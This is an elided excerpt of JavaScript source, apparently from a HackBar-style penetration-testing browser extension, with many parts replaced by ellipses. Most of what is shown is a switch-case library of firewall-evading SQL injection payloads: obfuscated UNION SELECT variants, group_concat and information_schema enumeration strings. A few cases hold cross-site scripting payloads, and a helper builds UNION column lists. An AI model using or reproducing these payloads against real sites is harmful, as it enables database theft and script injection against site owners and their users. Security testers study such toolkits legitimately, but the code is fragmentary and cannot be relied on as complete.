...
HackBar.SQL = {
    ...
    WichField: function(choice) {
        ...
        switch (str) {
            case 'main_toogle':
                ...
                document.getElementById('cookie_toogle').setAttribute("checked", false);
                break;
            case 'ref_toogle':
                document.getElementById(str).setAttribute("checked", true);
    ...
    statementsTpro: function(choice) {
        ...
        switch (str) {
            ...
            case 'UNION44':
                ...
                break;
            case 'UNION45':
                txt = 'uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/';
                break;
            case 'UNION46':
            ...
            case 'UNION63':
                ...
                break;
            case 'UNION64':
                txt = "/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/";
                break;
            case 'UNION65':
                txt = "%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/";
                break;
            case 'UNION66':
            ...
            case 'UNION69':
                ...
                break;
            case 'UNION70':
                txt = "/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/";
                break;
            case 'UNION71':
                txt = "/union\\sselect/g";
                break;
            ...
            case 'group_concat 18':
                txt = 'unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))';
                break;
            ...
            case 'group_concat 21':
                txt = 'unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))';
                break;
            ...
            case 'SCHEMA5':
                ...
                break;
            case 'SCHEMA6':
                txt = "/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns";
                break;
                //WAF BASED/ FIX POINT
            case 'FIX POINT1':
                txt = "--";
            ...
            case 'brutexss10':
                ...
                break;
            case 'brutexss11':
                txt = '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>';
                break;
            case 'brutexss12':
    ...
    UnionSelect1111tojoinselect: function(encoding) {
        ...
        repeat = Math.min(1000, parseInt(repeat));
        var colArray = new Array();
        var abc = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'aa', 'bb', 'cc', 'dd', 'ee', 'ff', 'gg', 'hh', 'ii', 'jj', 'kk', 'll', 'mm', 'nn', 'oo', 'pp', 'qq', 'rr', 'ss', 'tt', 'uu', 'vv', 'ww', 'xx', 'yy', 'zz', 'aaa', 'bbb', 'ccc', 'ddd', 'eee', 'fff', 'ggg', 'hhh', 'iii', 'jjj', 'kkk', 'lll', 'mmm', 'nnn', 'ooo', 'ppp', 'qqq', 'rrr', 'sss', 'ttt', 'uuu', 'vvv', 'www', 'xxx', 'yyy', 'zzz', 'aaaa', 'bbbb', 'cccc', 'dddd', 'eeee', 'ffff', 'gggg', 'hhhh', 'iiii', 'jjjj', 'kkkk', 'llll', 'mmmm', 'nnnn', 'oooo', 'pppp', 'qqqq', 'rrrr', 'ssss', 'tttt', 'uuuu', 'vvvv', 'wwww', 'xxxx', 'yyyy', 'zzz', 'aaaaa', 'bbbbb', 'ccccc', 'ddddd', 'eeeee', 'fffff', 'ggggg', 'hhhhh', 'iiiii', 'jjjjj', 'kkkkk', 'lllll', 'mmmmm', 'nnnnn', 'ooooo', 'ppppp', 'qqqqq', 'rrrrr', 'sssss', 'ttttt', 'uuuuu', 'vvvvv', 'wwwww', 'xxxxx', 'yyyyy', 'zzzz'];
        var colArray = new Array();
        for (var i = 0; i < columns; i++) {
            var push = String(i + 1)
            var txt = new Array();
